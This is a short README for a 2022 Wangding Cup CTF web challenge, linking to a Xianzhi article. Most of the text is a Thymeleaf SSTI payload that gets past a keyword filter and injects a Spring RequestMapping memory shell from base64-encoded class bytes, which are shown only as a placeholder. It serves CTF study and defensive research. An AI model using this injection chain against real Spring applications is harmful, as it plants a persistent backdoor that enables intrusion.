# CTF-you-can-find-it

2022 网鼎杯 玄武组 web ctf thymeleaf SSTI bypass and memshell to retrive flag


先知文章：https://xz.aliyun.com/t/11688

```java

__${T (org.springframework.cglib.core.ReflectUtils).defineClass("SpringRequestMappingMemshell", 
T (org.springframework.util.Base64Utils).decodeFromUrlSafeString("SpringRequestMappingMemshell.class的UrlSafebase64编码"), 
nEw javax.management.loading.MLet(NeW java.net.URL("http","127.0.0.1","1.txt"),T (java.lang.Thread).currentThread().getContextClassLoader())).doInject(T (org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0).getBean(T (Class).forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping")))}__::main.x

```
